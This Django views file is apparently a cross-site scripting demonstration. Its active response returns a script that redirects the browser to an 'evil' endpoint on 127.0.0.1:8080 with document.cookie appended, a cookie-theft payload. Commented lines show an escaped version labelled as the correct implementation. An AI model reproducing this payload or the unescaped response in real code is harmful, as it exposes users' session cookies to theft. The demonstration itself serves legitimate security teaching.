from django.contrib.auth.decorators import login_required
from django.http import HttpResponse
from django.template.response import TemplateResponse
from django.utils.html import escape


@login_required
def example(request):
    # return HttpResponse("Hello world")
    return HttpResponse('<script>window.location = "http://127.0.0.1:8080/evil?cookie="+escape(document.cookie)</script>')
    # Correct implementation:
    # return HttpResponse(escape('<script>alert("XSSです")</script>'))

    # context = {"message": '<script>alert("XSSです")</script>'}
    # return TemplateResponse(request, "example/index.html", context)
